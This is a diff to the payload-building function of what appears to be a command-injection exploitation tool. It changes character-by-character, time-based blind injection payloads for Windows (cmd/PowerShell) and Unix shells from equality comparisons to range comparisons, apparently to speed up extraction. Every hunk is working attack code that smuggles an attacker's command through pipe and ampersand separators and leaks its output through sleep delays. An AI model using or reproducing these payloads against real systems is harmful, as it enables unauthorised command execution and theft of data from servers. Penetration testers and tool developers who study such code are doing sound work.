@@ -295,14 +295,14 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
       pipe = "|"
       payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
-                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i GEQ " + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
-                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i GEQ " + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
     else:
@@ -321,8 +321,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 settings.RANDOM_VAR_GENERATOR + "2=" + settings.CMD_SUB_PREFIX + "expr substr \"$" + settings.RANDOM_VAR_GENERATOR + "\" " + str(num_of_chars) + " 1" + settings.CMD_SUB_SUFFIX + separator +
                 # Transform from Ascii to Decimal.
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "printf '%d' \"'$" + settings.RANDOM_VAR_GENERATOR + "2'\"" + settings.CMD_SUB_SUFFIX + separator +
-                # Perform the time-based comparisons
-                "if [ " + str(ascii_char) + " -eq $" + settings.RANDOM_VAR_GENERATOR + " ]" + separator +
+                "if [ " + str(ascii_char) + " -le $" + settings.RANDOM_VAR_GENERATOR + " ]" + separator +
                 # "then sleep 0" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
@@ -340,7 +339,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 # Transform from Ascii to Decimal.
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "printf '%d' \"'$" + settings.RANDOM_VAR_GENERATOR + "2'\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Perform the time-based comparisons
-                "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
+                "[ " + str(ascii_char) + " -le ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 "sleep " + str(timesec)
                 )
       # separator = _urllib.parse.unquote(separator)
@@ -348,7 +347,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + cmd + pipe + "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" +
+                "[ " + str(ascii_char) + " -gt " + settings.CMD_SUB_PREFIX + cmd + pipe + "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" +
                 pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i" +
                 pipe + "head -1" + pipe + "awk '{print$2}'" + settings.CMD_SUB_SUFFIX + " ]" + separator +
                 "sleep " + str(timesec)
